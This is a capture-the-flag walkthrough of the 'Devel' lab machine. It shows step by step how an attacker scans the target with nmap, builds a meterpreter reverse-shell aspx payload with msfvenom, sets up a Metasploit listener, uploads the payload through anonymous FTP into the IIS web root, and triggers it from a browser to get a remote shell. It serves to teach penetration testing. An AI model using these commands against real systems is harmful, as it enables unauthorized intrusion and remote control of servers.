# Devel Machine Writeup

Run an nmap scan on the target
```sh
> nmap -A -T4 -p- -v 10.10.14.4

# After inspecting the nmap output it has been understood that there is a web server running on port 80. ftp with anonymous login enabled on port 21.

# Lets go check the web server first.

# Default IIS web server page is there. it shows that we are in the web home directory.

# As the ftp service is open and anonymous login is enabled. lets try to upload a file in to the web server directory.

# We should create an aspx file as the server running is IIS server.
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f aspx > exploit.aspx

# A malicious payload file will be created as exploit.aspx.

# Before uploading and executing the payload, we have to create a listener using metasploit.
> msfconsole
> use exploit/multi/handler
> options 
> set payload windows/meterpreter/reverse_tcp
> set lhost tun0
> set lport 4444
> run
# listener started

# Now lets login to ftp service anonymously

> ftp 10.10.14.4
> password: press enter
>> put exploit.aspx
# file uploaded

# Now open the browser and go to http://10.10.14.4/exploit.aspx
> firefox http://10.10.14.4/exploit.aspx &

# The malicious payload is executed and a meterpreter session is created in the listener

# Now go to metasploit multi handler listener we started and do additional exploits.

meterpreter >>
>> getuid
>> # IIS APPPOOL\Web
# get system information and do further exploit

# Now we have gained the user access.

#Now this course is all about privilege escalation in windows machines.

Let's Roll
```